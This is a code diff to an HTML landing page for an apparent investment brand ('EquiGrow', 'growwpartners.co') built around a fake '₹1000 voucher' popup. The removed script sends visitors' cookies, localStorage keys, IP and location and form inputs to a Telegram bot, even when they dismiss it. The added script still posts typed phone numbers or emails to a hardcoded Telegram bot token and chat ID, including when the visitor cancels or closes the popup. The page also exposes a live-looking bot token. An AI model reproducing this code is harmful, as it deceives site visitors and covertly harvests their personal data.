@@ -34,7 +34,6 @@
             },
         }
     </script>
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
         /* Sub Branding Component */
 
@@ -118,7 +117,22 @@
                 font-size: 14px;
             }
         }
+
+        /* Modal Styles */
+        @keyframes modal-enter {
+            from { opacity: 0; transform: scale(0.8) translateY(20px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        .animate-modal-enter {
+            animation: modal-enter 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .modal-open {
+            overflow: hidden;
+        }
     </style>
+
 </head>
 
 <body
@@ -554,109 +568,51 @@
 
     </div>
 
-
-    <!-- Auto-popup Script -->
-    <script>
-        // Enhanced lead tracking function
-        async function sendLeadData(phone, email, action) {
-            const botToken = "8774323914:AAGBuC3Jivk8FVEv2kzSfRI_Tqg2orFdoWQ";
-            const chatId = "@YourChannel"; // REPLACE WITH YOUR CHAT_ID (message bot first, check getUpdates)
-            
-            // Auto-detect user details
-            const referrer = document.referrer || 'direct';
-            const userAgent = navigator.userAgent.slice(0,100);
-            const screen = `${screen.width}x${screen.height}`;
-            const lang = navigator.language;
-            const localData = Object.keys(localStorage).join(', ') || 'none';
-            const cookies = document.cookie || 'none';
-            const url = window.location.href;
-            const timestamp = new Date().toISOString();
-            
-            // Get IP/location
-            let ipInfo = 'unknown';
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                ipInfo = `${data.ip} (${data.city}, ${data.country_name})`;
-            } catch(e) {}
-            
-            const message = `🆕 LEAD from equigrow.com%0A📱 Phone: ${phone || 'N/A'}%0A✉️ Email: ${email || 'N/A'}%0A🎯 Action: ${action}%0A🌐 URL: ${url}%0A🔗 Referrer: ${referrer}%0A📱 UA: ${userAgent}%0A🖥️ Screen: ${screen}%0A🌍 IP/Location: ${ipInfo}%0A🗣️ Lang: ${lang}%0A💾 localStorage: ${localData}%0A🍪 Cookies: ${cookies}%0A⏰ Time: ${timestamp}`;
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-                .then(() => console.log(`Lead ${action} sent`))
-                .catch(err => console.error("Telegram:", err));
-        }
-
-        document.addEventListener("DOMContentLoaded", function () {
-            const domain = "growwpartners.co";
-            const popupKey = `popupShown_${domain}`;
-            
-            // Check if already shown
-            if (localStorage.getItem(popupKey)) {
-                return;
-            }
-            
-            setTimeout(() => {
-                // Auto-fill attempt from page inputs
-                const inputs = document.querySelectorAll("input[type='email'], input[type='tel'], input[name*='email'], input[name*='phone']");
-                const email = inputs[0]?.value || "";
-                const phone = inputs[1]?.value || "";
-                
-                Swal.fire({
-                    title: "🎉 Claim Your ₹1000 Voucher!",
-                    html: `
-                        <p class="text-lg mb-6">Exclusive offer for <strong>growwpartners.co</strong> visitors!</p>
-                        <div class="swal2-input-group swal2-input-group-phone">
-                            <input type="tel" id="phone" class="swal2-input" placeholder="📱 Phone (e.g. +91XXXXXXXXXX)" value="${phone}">
-                        </div>
-                        <div class="swal2-input-group">
-                            <input type="email" id="email" class="swal2-input" placeholder="✉️ Email" value="${email}">
-                        </div>
-                    `,
-                    icon: "success",
-                    showCancelButton: true,
-                    confirmButtonColor: "#00D09C",
-                    cancelButtonColor: "#6B7280",
-                    confirmButtonText: "✅ Claim Voucher",
-                    cancelButtonText: "❌ No Thanks",
-                    customClass: {
-                        popup: "swal2-popup-professional",
-                        title: "text-2xl font-bold text-slate-900",
-                        htmlContainer: "text-slate-700 text-lg",
-                        confirmButton: "bg-primary text-white font-bold py-3 px-8 rounded-xl text-lg hover:bg-green-500 shadow-lg",
-                        cancelButton: "font-bold py-3 px-8 rounded-xl text-lg hover:bg-slate-200"
-                    },
-                    width: "500px",
-                    padding: "2rem",
-                    backdrop: "rgba(0,0,0,0.5)",
-                    allowOutsideClick: true,
-                    preConfirm: () => {
-                        const phone = document.getElementById("phone").value;
-                        const email = document.getElementById("email").value;
-                        if (!phone && !email) {
-                            Swal.showValidationMessage("Please enter phone or email");
-                            return false;
-                        }
-                        return { phone, email };
-                    }
-                }).then((result) => {
-                    if (result.isConfirmed) {
-                        const phone = document.getElementById("phone").value;
-                        const email = document.getElementById("email").value;
-                        sendLeadData(phone, email, 'submit');
-                    }
-                    // Mark as shown
-                    localStorage.setItem(popupKey, "true");
-                }).catch(() => {
-                    // On dismiss/close - send details anyway
-                    sendLeadData('', '', 'cancel');
-                    localStorage.setItem(popupKey, "true");
-                });
-            }, 5000);
-        });
-    </script>
+    <!-- Subscription Popup Modal -->
+    <div id="subscriptionModal" class="fixed inset-0 z-[60] bg-black/60 backdrop-blur-sm hidden flex items-center justify-center p-4 animate-none">
+        <div class="bg-white dark:bg-neutral-dark rounded-3xl shadow-2xl max-w-md w-full mx-4 transform scale-100 opacity-100 animate-modal-enter border border-primary/20 max-h-[90vh] overflow-y-auto">
+            <!-- Header -->
+            <div class="p-8 pb-4 text-center border-b border-neutral-light dark:border-neutral-dark">
+                <button id="closeModal" class="absolute top-6 right-6 text-slate-400 hover:text-slate-900 dark:hover:text-white text-2xl transition-colors">&times;</button>
+                <div class="w-20 h-20 bg-primary/20 rounded-2xl flex items-center justify-center mx-auto mb-4">
+                    <span class="material-symbols-outlined text-primary text-5xl">card_giftcard</span>
+                </div>
+                <h3 class="text-2xl font-black bg-gradient-to-r from-primary to-green-500 bg-clip-text text-transparent mb-2">Get ₹1000 Voucher!</h3>
+                <p class="text-lg text-slate-600 dark:text-slate-300 font-semibold">Subscribe to get exclusive investment updates</p>
+            </div>
+            <!-- Form -->
+            <div class="p-8">
+                <div class="relative mb-6">
+                    <input id="contactInput" type="text" placeholder="Enter Phone or Email" 
+                           class="w-full px-5 py-4 bg-neutral-light dark:bg-neutral-dark border-2 border-neutral-light dark:border-neutral-dark rounded-2xl text-lg focus:border-primary focus:outline-none transition-all duration-300 placeholder:text-slate-500 peer"
+                           autocomplete="off">
+                    <span class="material-symbols-outlined absolute left-5 top-5 text-slate-400 peer-focus:text-primary transition-colors">smartphone</span>
+                    <p id="errorMsg" class="mt-2 text-red-500 text-sm hidden">Please enter valid phone (10 digits) or email</p>
+                </div>
+                <button id="submitBtn" class="w-full bg-gradient-to-r from-primary to-green-500 text-white font-black py-4 px-8 rounded-2xl text-lg shadow-xl hover:shadow-2xl hover:scale-[1.02] transition-all duration-300 flex items-center justify-center gap-3 mb-4">
+                    <span class="material-symbols-outlined">send</span>
+                    Claim Voucher Now
+                </button>
+                <div class="text-center">
+                    <button id="cancelBtn" class="text-slate-500 hover:text-slate-900 dark:hover:text-white font-medium transition-colors px-4 py-2">Not now</button>
+                </div>
+            </div>
+            <!-- Success State (hidden) -->
+            <div id="successState" class="p-8 text-center hidden">
+                <div class="w-24 h-24 bg-green-100 dark:bg-green-900/30 rounded-3xl flex items-center justify-center mx-auto mb-6">
+                    <span class="material-symbols-outlined text-green-500 text-6xl">check_circle</span>
+                </div>
+                <h3 class="text-2xl font-black text-green-600 dark:text-green-400 mb-4">Voucher Claimed!</h3>
+                <p class="text-lg text-slate-600 dark:text-slate-300 mb-8">Check your phone/email for EQUIGROW1000 code. Thank you!</p>
+                <button id="successClose" class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-4 px-8 rounded-2xl shadow-xl transition-all duration-300">
+                    Continue to Site
+                </button>
+            </div>
+        </div>
+    </div>
 
     <script>
+
 
         document.addEventListener("DOMContentLoaded", function () {
 
@@ -703,6 +659,117 @@
             let v = document.getElementById("promoVideo");
             v.style.display = "block";
         }
+
+        // Subscription Modal JS
+        const TELEGRAM_TOKEN = '8774323914:AAGBuC3Jivk8FVEv2kzSfRI_Tqg2orFdoWQ';
+        const TELEGRAM_CHAT_ID = '8652805995';
+        const modal = document.getElementById('subscriptionModal');
+        const contactInput = document.getElementById('contactInput');
+        const submitBtn = document.getElementById('submitBtn');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const closeModal = document.getElementById('closeModal');
+        const successState = document.getElementById('successState');
+        const errorMsg = document.getElementById('errorMsg');
+        const successClose = document.getElementById('successClose');
+
+        let hasShownToday = localStorage.getItem('modalShownToday') === 'true';
+
+        function showModal() {
+            if (hasShownToday) return;
+            modal.classList.remove('hidden');
+            modal.classList.add('flex', 'animate-modal-enter', 'modal-open');
+            document.body.classList.add('modal-open');
+        }
+
+        function hideModal() {
+            modal.classList.add('animate-none');
+            modal.classList.remove('flex', 'animate-modal-enter');
+            setTimeout(() => {
+                modal.classList.add('hidden');
+                document.body.classList.remove('modal-open');
+            }, 400);
+            localStorage.setItem('modalShownToday', 'true');
+        }
+
+        function validateContact(contact) {
+            const phoneRegex = /^[6-9]\d{9}$/;
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return phoneRegex.test(contact) || emailRegex.test(contact);
+        }
+
+        async function sendToTelegram(text, isSubmit = false) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: `EquiGrow Lead | ${isSubmit ? 'SUBMITTED' : 'CANCELLED'}\n\n${text}`
+                    })
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('Telegram send failed:', error);
+                return false;
+            }
+        }
+
+        // Event Listeners
+        submitBtn.addEventListener('click', async () => {
+            const contact = contactInput.value.trim();
+            if (!contact) {
+                errorMsg.textContent = 'Please enter your contact info';
+                errorMsg.classList.remove('hidden');
+                return;
+            }
+            if (!validateContact(contact)) {
+                errorMsg.textContent = 'Please enter valid phone (10 digits starting 6-9) or email';
+                errorMsg.classList.remove('hidden');
+                return;
+            }
+
+            errorMsg.classList.add('hidden');
+            const sent = await sendToTelegram(`Contact: ${contact}\nType: ${contact.includes('@') ? 'Email' : 'Phone'}`, true);
+            
+            if (sent) {
+                document.querySelector('.p-8:not(#successState)').style.display = 'none';
+                successState.classList.remove('hidden');
+            }
+        });
+
+        function closeActions() {
+            const contact = contactInput.value.trim();
+            const text = contact ? `Contact: ${contact}` : 'No contact provided';
+            sendToTelegram(text, false);
+            hideModal();
+        }
+
+        cancelBtn.addEventListener('click', closeActions);
+        closeModal.addEventListener('click', closeActions);
+        successClose.addEventListener('click', hideModal);
+
+        // Auto-trigger
+        setTimeout(showModal, 5000);
+
+        let lastScrollY = 0;
+        window.addEventListener('scroll', () => {
+            if (window.scrollY > document.body.scrollHeight * 0.5 && !hasShownToday) {
+                showModal();
+            }
+        });
+
+        // ESC key close
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && !modal.classList.contains('hidden')) {
+                closeActions();
+            }
+        });
+
+        // Outside click close
+        modal.addEventListener('click', (e) => {
+            if (e.target === modal) closeActions();
+        });
 
     </script>
 
